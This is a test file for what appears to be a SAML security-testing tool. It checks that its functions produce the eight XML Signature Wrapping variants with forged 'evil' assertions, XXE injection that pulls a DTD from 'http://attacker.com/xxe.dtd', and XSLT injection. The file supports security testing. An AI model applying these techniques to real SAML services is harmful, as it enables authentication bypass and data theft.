import { describe, it, expect } from "vitest";
import { SAMLAttacks } from "./attacks";

/**
 * Test SAML Response based on the SAMLRaider test format
 * Contains: Response with Signature, Assertion with Subject/NameID
 */
const sampleSAMLResponse = `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_response_id_123" Version="2.0" IssueInstant="2023-01-01T00:00:00Z" Destination="http://sp.example.com/acs">
  <saml:Issuer>http://idp.example.com</saml:Issuer>
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      <ds:Reference URI="#_response_id_123">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <ds:DigestValue>digestvalue123</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>signaturevalue123</ds:SignatureValue>
  </ds:Signature>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_id_456" Version="2.0" IssueInstant="2023-01-01T00:00:00Z">
    <saml:Issuer>http://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@example.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2023-01-01T01:00:00Z" Recipient="http://sp.example.com/acs"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2023-01-01T00:00:00Z" NotOnOrAfter="2023-01-01T01:00:00Z">
      <saml:AudienceRestriction>
        <saml:Audience>http://sp.example.com</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2023-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>user@example.com</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`;

const assertionSignedResponse = `<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_response_789" Version="2.0">
  <saml:Issuer>http://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion_abc" Version="2.0">
    <saml:Issuer>http://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:Reference URI="#_assertion_abc">
          <ds:DigestValue>digest</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>sig</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>admin@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>`;

describe("SAMLAttacks - XSW Attacks", () => {
  
  describe("XSW1 - Response wrapping with Signature envelope", () => {
    it("should clone Response and nest inside Signature", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 1);
      expect(result.success).toBe(true);
      expect(result.xml).toBeDefined();
      expect(result.xml).toContain('ID="_evil_response_ID"');
      expect(result.xml).toContain('<ds:Signature');
    });
  });

  describe("XSW2 - Response wrapping with detached signature", () => {
    it("should clone Response and insert before Signature", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 2);
      expect(result.success).toBe(true);
      expect(result.xml).toBeDefined();
      expect(result.xml).toContain('ID="_evil_response_ID"');
    });
  });

  describe("XSW3 - Evil Assertion before original", () => {
    it("should insert evil assertion before original", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 3);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
      const assertionCount = (result.xml!.match(/<saml:Assertion/g) || []).length;
      expect(assertionCount).toBe(2);
    });

    it("should modify NameID in evil assertion", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 3);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('evil-user@example.com');
    });
  });

  describe("XSW4 - Original Assertion wrapped by evil", () => {
    it("should wrap original assertion inside evil assertion", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 4);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
    });
  });

  describe("XSW5 - Evil in place, clone appended", () => {
    it("should make original evil and append clean clone", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 5);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
    });
  });

  describe("XSW6 - Clone inside Signature element", () => {
    it("should nest clone inside Signature", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 6);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
    });
  });

  describe("XSW7 - Evil in Extensions element", () => {
    it("should wrap evil assertion in Extensions", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 7);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('<Extensions>');
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
    });
  });

  describe("XSW8 - Clone in Object element inside Signature", () => {
    it("should wrap clone in Object inside Signature", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 8);
      expect(result.success).toBe(true);
      expect(result.xml).toContain('<ds:Object>');
      expect(result.xml).toContain('ID="_evil_assertion_ID"');
    });
  });

  describe("Error handling", () => {
    it("should return error for invalid variant", () => {
      const result = SAMLAttacks.applyXSW(sampleSAMLResponse, 99);
      expect(result.success).toBe(false);
      expect(result.error).toContain("not supported");
    });

    it("should return error for XML without Assertion", () => {
      const noAssertionXml = `<samlp:Response><saml:Issuer>test</saml:Issuer></samlp:Response>`;
      const result = SAMLAttacks.applyXSW(noAssertionXml, 3);
      expect(result.success).toBe(false);
    });
  });
});

describe("SAMLAttacks - XXE Injection", () => {
  const sampleXml = `<?xml version="1.0"?><samlp:Response><saml:Assertion ID="_123"><saml:NameID>user</saml:NameID></saml:Assertion></samlp:Response>`;

  it("should insert DOCTYPE with XXE payload from URL", () => {
    const url = 'http://attacker.com/xxe.dtd';
    const result = SAMLAttacks.applyXXE(sampleXml, url);
    expect(result).toContain('<!DOCTYPE foo');
    expect(result).toContain('<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">');
    expect(result).toContain('%xxe;');
  });

  it("should prepend DOCTYPE when no XML declaration", () => {
    const noDecl = `<samlp:Response><saml:Assertion ID="_1"><saml:NameID>user</saml:NameID></saml:Assertion></samlp:Response>`;
    const url = 'http://attacker.com/xxe.dtd';
    const result = SAMLAttacks.applyXXE(noDecl, url);
    expect(result.startsWith('<!DOCTYPE')).toBe(true);
  });
});

describe("SAMLAttacks - XSLT Injection", () => {
  const sampleXml = `<?xml version="1.0"?><samlp:Response><saml:Assertion ID="_123"><saml:NameID>user</saml:NameID></saml:Assertion></samlp:Response>`;

  it("should insert xml-stylesheet processing instruction", () => {
    const payload = '<xsl:stylesheet/>';
    const result = SAMLAttacks.applyXSLT(sampleXml, payload);
    expect(result).toContain('<?xml-stylesheet');
    expect(result).toContain('type="text/xsl"');
    expect(result).toContain('data:text/xml;base64,');
  });

  it("should base64 encode the payload", () => {
    const payload = 'test payload';
    const result = SAMLAttacks.applyXSLT(sampleXml, payload);
    const match = result.match(/base64,([A-Za-z0-9+/=]+)/);
    expect(match).toBeTruthy();
  });
});
